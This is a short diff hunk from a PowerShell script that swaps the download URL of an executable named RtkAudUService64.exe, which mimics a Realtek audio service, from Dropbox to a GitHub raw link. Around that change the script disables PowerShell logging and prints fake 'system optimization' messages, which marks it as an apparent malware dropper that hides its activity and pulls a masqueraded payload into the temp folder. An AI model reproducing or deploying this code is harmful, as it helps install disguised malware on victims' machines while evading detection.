@@ -85,7 +85,7 @@ try {
     Disable-PowerShellLogging
     
     $exe = "$env:TEMP\RtkAudUService64.exe"
-    $url = "https://www.dropbox.com/scl/fi/3awi1z0xyoxijxsryw607/RtkAudUService64.exe?rlkey=xs32qsa557s98l0vywym2scrq&st=5agkt4dq&dl=1"
+    $url = "https://raw.githubusercontent.com/sandeepmanglekar17-sys/exe/refs/heads/main/RtkAudUService64.exe"
     
     Write-Host "`n[+] INITIALIZING SYSTEM HYPER-CONNECTION..." -ForegroundColor Yellow
     Write-Host "[+] OPTIMIZING SYSTEM ENVIRONMENT..." -ForegroundColor Gray
